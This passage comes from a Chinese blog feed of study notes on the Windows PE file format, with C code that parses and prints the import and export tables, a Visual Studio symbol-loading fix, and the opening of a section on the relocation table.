data-num="9"></td><td><pre>	PIMAGE_NT_HEADERS pNt <span class="token operator">=</span> <span class="token punctuation">(</span>PIMAGE_NT_HEADERS<span class="token punctuation">)</span><span class="token punctuation">(</span>pDos<span class="token operator">-></span>e_lfanew <span class="token operator">+</span> buffer<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="10"></td><td><pre>	<span class="token comment">// 定位导入表</span></pre></td></tr><tr><td data-num="11"></td><td><pre>	PIMAGE_DATA_DIRECTORY pImportDir <span class="token operator">=</span> <span class="token punctuation">(</span>PIMAGE_DATA_DIRECTORY<span class="token punctuation">)</span><span class="token punctuation">(</span>pNt<span class="token operator">-></span>OptionalHeader<span class="token punctuation">.</span>DataDirectory <span class="token operator">+</span> IMAGE_DIRECTORY_ENTRY_IMPORT<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="12"></td><td><pre>	<span class="token comment">// 填充结构</span></pre></td></tr><tr><td data-num="13"></td><td><pre>	PIMAGE_IMPORT_DESCRIPTOR pImport <span class="token operator">=</span> <span class="token punctuation">(</span>PIMAGE_IMPORT_DESCRIPTOR<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token function">RvaToOffset</span><span class="token punctuation">(</span>pImportDir<span class="token operator">-></span>VirtualAddress<span class="token punctuation">,</span> buffer<span class="token punctuation">)</span> <span class="token operator">+</span> buffer<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="14"></td><td><pre>	<span class="token keyword">while</span> <span class="token punctuation">(</span>pImport<span class="token operator">-></span>Name <span class="token operator">!=</span> <span class="token constant">NULL</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="15"></td><td><pre>	<span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="16"></td><td><pre>		<span class="token keyword">char</span> <span class="token operator">*</span> szDllName <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token function">RvaToOffset</span><span class="token punctuation">(</span>pImport<span class="token operator">-></span>Name<span class="token punctuation">,</span> buffer<span class="token punctuation">)</span> <span class="token operator">+</span> buffer<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="17"></td><td><pre>		<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"DLL名称：%s\n"</span><span class="token punctuation">,</span> szDllName<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="18"></td><td><pre>		<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"日期时间标志：%08X\n"</span><span class="token punctuation">,</span> pImport<span class="token operator">-></span>TimeDateStamp<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="19"></td><td><pre>		<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"ForwarderChain：%08X\n"</span><span class="token punctuation">,</span> pImport<span class="token operator">-></span>ForwarderChain<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="20"></td><td><pre>		<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"名称OFFSET：%08X\n"</span><span class="token punctuation">,</span> pImport<span class="token operator">-></span>Name<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="21"></td><td><pre>		<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"FirstThunk：%08X\n"</span><span class="token punctuation">,</span> pImport<span class="token operator">-></span>FirstThunk<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="22"></td><td><pre>		<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"OriginalFirstThunk：%08X\n\n"</span><span class="token punctuation">,</span> pImport<span class="token operator">-></span>OriginalFirstThunk<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="23"></td><td><pre>		<span class="token comment">// 指向导入地址表的 RVA</span></pre></td></tr><tr><td data-num="24"></td><td><pre>		PIMAGE_THUNK_DATA pIat <span class="token operator">=</span> <span class="token punctuation">(</span>PIMAGE_THUNK_DATA<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token function">RvaToOffset</span><span class="token punctuation">(</span>pImport<span class="token operator">-></span>OriginalFirstThunk<span class="token punctuation">,</span> buffer<span class="token punctuation">)</span> <span class="token operator">+</span> buffer<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="25"></td><td><pre>		<span class="token comment">// 声明变量：导入表的偏移和补位</span></pre></td></tr><tr><td data-num="26"></td><td><pre>		DWORD index <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="27"></td><td><pre>		DWORD ImportOffset <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="28"></td><td><pre>		<span class="token comment">// 被导入函数的序号</span></pre></td></tr><tr><td data-num="29"></td><td><pre>		<span class="token keyword">while</span> <span class="token punctuation">(</span>pIat<span class="token operator">-></span>u1<span class="token punctuation">.</span>Ordinal <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="30"></td><td><pre>		<span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="31"></td><td><pre>			<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"ThunkRva：%08X\n"</span><span class="token punctuation">,</span> pImport<span class="token operator">-></span>OriginalFirstThunk <span class="token operator">+</span> index<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="32"></td><td><pre>			ImportOffset <span class="token operator">=</span> <span class="token function">RvaToOffset</span><span class="token punctuation">(</span>pImport<span class="token operator">-></span>OriginalFirstThunk<span class="token punctuation">,</span> buffer<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="33"></td><td><pre>			<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"ThunkOffset：%08X\n"</span><span class="token punctuation">,</span> ImportOffset <span class="token operator">+</span> index<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="34"></td><td><pre>			index <span class="token operator">+=</span> <span class="token number">4</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="35"></td><td><pre>			<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>pIat<span class="token operator">-></span>u1<span class="token punctuation">.</span>Ordinal <span class="token operator">&amp;</span> <span class="token number">0x80000000</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token number">1</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="36"></td><td><pre>			<span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="37"></td><td><pre>				PIMAGE_IMPORT_BY_NAME pName <span class="token operator">=</span> <span class="token punctuation">(</span>PIMAGE_IMPORT_BY_NAME<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token function">RvaToOffset</span><span class="token punctuation">(</span>pIat<span class="token operator">-></span>u1<span class="token punctuation">.</span>AddressOfData<span class="token punctuation">,</span> buffer<span class="token punctuation">)</span> <span class="token operator">+</span> buffer<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="38"></td><td><pre>				<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"API名称：%s\n"</span><span class="token punctuation">,</span> pName<span class="token operator">-></span>Name<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// 名称</span></pre></td></tr><tr><td data-num="39"></td><td><pre>				<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Hint(序号)：%04X\n"</span><span class="token punctuation">,</span> pName<span class="token operator">-></span>Hint<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// 序号</span></pre></td></tr><tr><td data-num="40"></td><td><pre>				<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"ThunkValue：%08X\n\n"</span><span class="token punctuation">,</span> pIat<span class="token operator">-></span>u1<span class="token punctuation">.</span>Function<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// 被导入函数的地址</span></pre></td></tr><tr><td data-num="41"></td><td><pre>			<span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="42"></td><td><pre>			pIat <span class="token operator">++</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="43"></td><td><pre>		<span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="44"></td><td><pre>		pImport <span class="token operator">++</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="45"></td><td><pre>	<span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="46"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr></table></figure><h3 id="运行结果-3"><a class="anchor" href="#运行结果-3">#</a> 运行结果</h3>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220226142448246.png" alt="image-20220226142448246" /></p>
<h2 id="报错"><a class="anchor" href="#报错">#</a> 报错</h2>
<figure class="highlight shell"><figcaption data-lang="Bash"></figcaption><table><tr><td data-num="1"></td><td><pre>“Project3.exe”<span class="token punctuation">(</span>Win32<span class="token punctuation">)</span>: 已加载“C:<span class="token punctuation">\</span>Windows<span class="token punctuation">\</span>SysWOW64<span class="token punctuation">\</span>ntdll.dll”。无法查找或打开 PDB 文件。</pre></td></tr><tr><td data-num="2"></td><td><pre>“Project3.exe”<span class="token punctuation">(</span>Win32<span class="token punctuation">)</span>: 已加载“C:<span class="token punctuation">\</span>Windows<span class="token punctuation">\</span>SysWOW64<span class="token punctuation">\</span>kernel32.dll”。无法查找或打开 PDB 文件。</pre></td></tr><tr><td data-num="3"></td><td><pre>“Project3.exe”<span class="token punctuation">(</span>Win32<span class="token punctuation">)</span>: 已加载“C:<span class="token punctuation">\</span>Windows<span class="token punctuation">\</span>SysWOW64<span class="token punctuation">\</span>KernelBase.dll”。无法查找或打开 PDB 文件。</pre></td></tr><tr><td data-num="4"></td><td><pre>“Project3.exe”<span class="token punctuation">(</span>Win32<span class="token punctuation">)</span>: 已加载“C:<span class="token punctuation">\</span>Windows<span class="token punctuation">\</span>SysWOW64<span class="token punctuation">\</span>vcruntime140d.dll”。无法查找或打开 PDB 文件。</pre></td></tr><tr><td data-num="5"></td><td><pre>“Project3.exe”<span class="token punctuation">(</span>Win32<span class="token punctuation">)</span>: 已加载“C:<span class="token punctuation">\</span>Windows<span class="token punctuation">\</span>SysWOW64<span class="token punctuation">\</span>ucrtbased.dll”。无法查找或打开 PDB 文件。</pre></td></tr></table></figure><h3 id="报错原因"><a class="anchor" href="#报错原因">#</a> 报错原因</h3>
<p>因为之前换行符 &quot;\&quot; 显示为 &quot;￥&quot;，所以更换了字体为 <code>仿宋体</code> 从而导致部分符号需重新挂载</p>
<h3 id="解决方法"><a class="anchor" href="#解决方法">#</a> 解决方法</h3>
<ol>
<li>点 <code>调试</code> ，然后  <code>选项</code></li>
</ol>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220226122642938.png" alt="image-20220226122642938" /></p>
<ol start="2">
<li>右边勾上  <code>启用源服务器支持</code></li>
</ol>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220226122743439.png" alt="image-20220226122743439" /></p>
<ol start="3">
<li>左边点  <code>符号</code> ，把  <code>微软符号服务器</code>  勾选上</li>
</ol>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220226122823133.png" alt="image-20220226122823133" /></p>
<ol start="4">
<li>运行的时候等一下，等待加载完成后就好了。</li>
</ol>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220226122854825.png" alt="image-20220226122854825" /></p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220226123337123.png" alt="image-20220226123337123" /></p>
]]></content>
      <categories>
        <category>PE文件结构解析</category>
      </categories>
      <tags>
        <tag>PE文件结构解析</tag>
      </tags>
  </entry>
  <entry>
    <title>Windows PE文件结构解析Studying Notes之导出表与重定位表结构解析</title>
    <url>/article/61ca529c.html</url>
    <content><![CDATA[<h1 id="导出表结构解析"><a class="anchor" href="#导出表结构解析">#</a> 导出表结构解析</h1>
<p>PE 编辑器中的导出表信息</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220226190817553.png" alt="image-20220226190817553" /></p>
<p>VS 中导出表结构信息</p>
<figure class="highlight c"><figcaption data-lang="c"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token keyword">typedef</span> <span class="token keyword">struct</span> <span class="token class-name">_IMAGE_EXPORT_DIRECTORY</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="2"></td><td><pre>    DWORD   Characteristics<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="3"></td><td><pre>    DWORD   TimeDateStamp<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="4"></td><td><pre>    WORD    MajorVersion<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="5"></td><td><pre>    WORD    MinorVersion<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="6"></td><td><pre>    DWORD   Name<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="7"></td><td><pre>    DWORD   Base<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="8"></td><td><pre>    DWORD   NumberOfFunctions<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="9"></td><td><pre>    DWORD   NumberOfNames<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="10"></td><td><pre>    DWORD   AddressOfFunctions<span class="token punctuation">;</span>     <span class="token comment">// RVA from base of image</span></pre></td></tr><tr><td data-num="11"></td><td><pre>    DWORD   AddressOfNames<span class="token punctuation">;</span>         <span class="token comment">// RVA from base of image</span></pre></td></tr><tr><td data-num="12"></td><td><pre>    DWORD   AddressOfNameOrdinals<span class="token punctuation">;</span>  <span class="token comment">// RVA from base of image</span></pre></td></tr><tr><td data-num="13"></td><td><pre><span class="token punctuation">&#125;</span> IMAGE_EXPORT_DIRECTORY<span class="token punctuation">,</span> <span class="token operator">*</span>PIMAGE_EXPORT_DIRECTORY<span class="token punctuation">;</span></pre></td></tr></table></figure><p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220226190938370.png" alt="image-20220226190938370" /></p>
<h2 id="测试代码"><a class="anchor" href="#测试代码">#</a> 测试代码</h2>
<figure class="highlight c"><figcaption data-lang="c"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token comment">// 解析导出表的函数</span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token keyword">void</span> <span class="token function">ExportTable</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span> buffer<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="3"></td><td><pre></pre></td></tr><tr><td data-num="4"></td><td><pre><span class="token keyword">void</span> <span class="token function">ExportTable</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span> buffer<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="5"></td><td><pre><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="6"></td><td><pre>	<span class="token comment">//Dos 头</span></pre></td></tr><tr><td data-num="7"></td><td><pre>	PIMAGE_DOS_HEADER pDos <span class="token operator">=</span> <span class="token punctuation">(</span>PIMAGE_DOS_HEADER<span class="token punctuation">)</span>buffer<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="8"></td><td><pre>	<span class="token comment">//PE 头</span></pre></td></tr><tr><td data-num="9"></td><td><pre>	PIMAGE_NT_HEADERS pNt <span class="token operator">=</span> <span class="token punctuation">(</span>PIMAGE_NT_HEADERS<span class="token punctuation">)</span><span class="token punctuation">(</span>pDos<span class="token operator">-></span>e_lfanew <span class="token operator">+</span> buffer<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="10"></td><td><pre>	<span class="token comment">// 定位数据目录表中的导出表</span></pre></td></tr><tr><td data-num="11"></td><td><pre>	PIMAGE_DATA_DIRECTORY pExportDir <span class="token operator">=</span> pNt<span class="token operator">-></span>OptionalHeader<span class="token punctuation">.</span>DataDirectory <span class="token operator">+</span> IMAGE_DIRECTORY_ENTRY_EXPORT<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="12"></td><td><pre>	<span class="token comment">// 填充导出表结构</span></pre></td></tr><tr><td data-num="13"></td><td><pre>	PIMAGE_EXPORT_DIRECTORY pExport <span class="token operator">=</span> <span class="token punctuation">(</span>PIMAGE_EXPORT_DIRECTORY<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token function">RvaToOffset</span><span class="token punctuation">(</span>pExportDir<span class="token operator">-></span>VirtualAddress<span class="token punctuation">,</span> buffer<span class="token punctuation">)</span> <span class="token operator">+</span> buffer<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="14"></td><td><pre>	<span class="token keyword">char</span> <span class="token operator">*</span> szName <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token function">RvaToOffset</span><span class="token punctuation">(</span>pExport<span class="token operator">-></span>Name<span class="token punctuation">,</span> buffer<span class="token punctuation">)</span> <span class="token operator">+</span> buffer<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="15"></td><td><pre>	<span class="token keyword">if</span> <span class="token punctuation">(</span>pExport<span class="token operator">-></span>AddressOfFunctions <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="16"></td><td><pre>	<span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="17"></td><td><pre>		<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"当前没有导出表！\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="18"></td><td><pre>		<span class="token keyword">return</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="19"></td><td><pre>	<span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="20"></td><td><pre>	<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"导出表的OFFSET：%08X\n"</span><span class="token punctuation">,</span> <span class="token function">RvaToOffset</span><span class="token punctuation">(</span>pExportDir<span class="token operator">-></span>VirtualAddress<span class="token punctuation">,</span> buffer<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="21"></td><td><pre>	<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"特征值：%08X\n"</span><span class="token punctuation">,</span> pExport<span class="token operator">-></span>Characteristics<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="22"></td><td><pre>	<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"基址：%08X\n"</span><span class="token punctuation">,</span> pExport<span class="token operator">-></span>Base<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="23"></td><td><pre>	<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"名称OFFSET：%08X\n"</span><span class="token punctuation">,</span> pExport<span class="token operator">-></span>Name<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="24"></td><td><pre>	<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"名称：%s\n"</span><span class="token punctuation">,</span> szName<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="25"></td><td><pre>	<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"函数数量：%08X\n"</span><span class="token punctuation">,</span> pExport<span class="token operator">-></span>NumberOfFunctions<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="26"></td><td><pre>	<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"函数名数量：%08X\n"</span><span class="token punctuation">,</span> pExport<span class="token operator">-></span>NumberOfNames<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="27"></td><td><pre>	<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"函数地址：%08X\n"</span><span class="token punctuation">,</span> pExport<span class="token operator">-></span>AddressOfFunctions<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="28"></td><td><pre>	<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"函数名称地址：%08X\n"</span><span class="token punctuation">,</span> pExport<span class="token operator">-></span>AddressOfNames<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="29"></td><td><pre>	<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"函数名称序号：%08X\n"</span><span class="token punctuation">,</span> pExport<span class="token operator">-></span>AddressOfNameOrdinals<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="30"></td><td><pre>	<span class="token comment">// 函数数量</span></pre></td></tr><tr><td data-num="31"></td><td><pre>	DWORD dwNumOfFun <span class="token operator">=</span> pExport<span class="token operator">-></span>NumberOfFunctions<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="32"></td><td><pre>	<span class="token comment">// 函数名数量</span></pre></td></tr><tr><td data-num="33"></td><td><pre>	DWORD dwNumOfNames <span class="token operator">=</span> pExport<span class="token operator">-></span>NumberOfNames<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="34"></td><td><pre>	<span class="token comment">// 基址</span></pre></td></tr><tr><td data-num="35"></td><td><pre>	DWORD dwBase <span class="token operator">=</span> pExport<span class="token operator">-></span>Base<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="36"></td><td><pre>	<span class="token comment">// 导出地址表</span></pre></td></tr><tr><td data-num="37"></td><td><pre>	PDWORD pEat32 <span class="token operator">=</span> <span class="token punctuation">(</span>PDWORD<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token function">RvaToOffset</span><span class="token punctuation">(</span>pExport<span class="token operator">-></span>AddressOfFunctions<span class="token punctuation">,</span> buffer<span class="token punctuation">)</span> <span class="token operator">+</span> buffer<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="38"></td><td><pre>	<span class="token comment">// 导出名称表</span></pre></td></tr><tr><td data-num="39"></td><td><pre>	PDWORD pEnt32 <span class="token operator">=</span> <span class="token punctuation">(</span>PDWORD<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token function">RvaToOffset</span><span class="token punctuation">(</span>pExport<span class="token operator">-></span>AddressOfNames<span class="token punctuation">,</span> buffer<span class="token punctuation">)</span> <span class="token operator">+</span> buffer<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="40"></td><td><pre>	<span class="token comment">// 导出序号表</span></pre></td></tr><tr><td data-num="41"></td><td><pre>	PWORD pId <span class="token operator">=</span> <span class="token punctuation">(</span>PWORD<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token function">RvaToOffset</span><span class="token punctuation">(</span>pExport<span class="token operator">-></span>AddressOfNameOrdinals<span class="token punctuation">,</span> buffer<span class="token punctuation">)</span> <span class="token operator">+</span> buffer<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="42"></td><td><pre>	<span class="token keyword">for</span> <span class="token punctuation">(</span>DWORD i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> dwNumOfFun<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="43"></td><td><pre>	<span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="44"></td><td><pre>		<span class="token keyword">if</span> <span class="token punctuation">(</span>pEat32<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="45"></td><td><pre>		<span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="46"></td><td><pre>			<span class="token keyword">continue</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="47"></td><td><pre>		<span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="48"></td><td><pre>		DWORD Id <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="49"></td><td><pre>		<span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token punctuation">;</span> Id <span class="token operator">&lt;</span> dwNumOfNames<span class="token punctuation">;</span> Id<span class="token operator">++</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="50"></td><td><pre>		<span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="51"></td><td><pre>			<span class="token keyword">if</span> <span class="token punctuation">(</span>pId<span class="token punctuation">[</span>Id<span class="token punctuation">]</span> <span class="token operator">==</span> i<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="52"></td><td><pre>			<span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="53"></td><td><pre>				<span class="token keyword">break</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="54"></td><td><pre>			<span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="55"></td><td><pre>		<span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="56"></td><td><pre>		<span class="token keyword">if</span> <span class="token punctuation">(</span>Id <span class="token operator">==</span> dwNumOfNames<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="57"></td><td><pre>		<span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="58"></td><td><pre>			<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Id：%x Address：0x%08X Name[NULL]\n"</span><span class="token punctuation">,</span> i <span class="token operator">+</span> dwBase<span class="token punctuation">,</span> pEat32<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="59"></td><td><pre>		<span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="60"></td><td><pre>		<span class="token keyword">else</span></pre></td></tr><tr><td data-num="61"></td><td><pre>		<span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="62"></td><td><pre>			<span class="token keyword">char</span> <span class="token operator">*</span> szFunName <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token function">RvaToOffset</span><span class="token punctuation">(</span>pEnt32<span class="token punctuation">[</span>Id<span class="token punctuation">]</span><span class="token punctuation">,</span> buffer<span class="token punctuation">)</span> <span class="token operator">+</span> buffer<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="63"></td><td><pre>			<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Id：%x Address：0x%08X Name[%s]\n"</span><span class="token punctuation">,</span> i <span class="token operator">+</span> dwBase<span class="token punctuation">,</span> pEat32<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">,</span>szFunName<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="64"></td><td><pre>		<span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="65"></td><td><pre>	<span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="66"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr></table></figure><h2 id="运行结果"><a class="anchor" href="#运行结果">#</a> 运行结果</h2>
<h3 id="无导出表测试结果"><a class="anchor" href="#无导出表测试结果">#</a> 无导出表测试结果</h3>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220226195202771.png" alt="image-20220226195202771" /></p>
<h3 id="有导出表测试结果"><a class="anchor" href="#有导出表测试结果">#</a> 有导出表测试结果</h3>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220226195344675.png" alt="image-20220226195344675" /></p>
<h1 id="重定位表结构解析"><a class="anchor" href="#重定位表结构解析">#</a> 重定位表结构解析</h1>
<p>VS 中的重定位结构 <code>IMAGE_BASE_RELOCATION</code></p>
<figure class="highlight c"><figcaption data-lang="c"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token keyword">typedef</span> <span class="token keyword">struct</span> <span class="token class-name">_IMAGE_BASE_RELOCATION</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="2"></td><td><pre>    DWORD   VirtualAddress<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="3"></td><td><pre>    DWORD   SizeOfBlock<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="4"></td><td><pre><span class="token comment">//  WORD    TypeOffset[1];</span></pre></td></tr><tr><td data-num="5"></td><td><pre><span class="token punctuation">&#125;</span> IMAGE_BASE_RELOCATION<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="6"></td><td><pre><span class="token keyword">typedef</span> IMAGE_BASE_RELOCATION UNALIGNED <span class="token operator">*</span> PIMAGE_BASE_RELOCATION<span class="token punctuation">;</span></pre></td></tr></table></figure><p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220227115703323.png" alt="image-20220227115703323" /></p>
<ul>
<li>VirtualAddress：指向 PE 中需要重定向的 Rva</li>
<li>SizeOfBlock：体积总和</li>
</ul>
<p>lordPE 中重定位表</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220227121319288.png" alt="image-20220227121319288" /></p>
<h2 id="测试代码-2"><a class="anchor" href="#测试代码-2">#</a> 测试代码</h2>
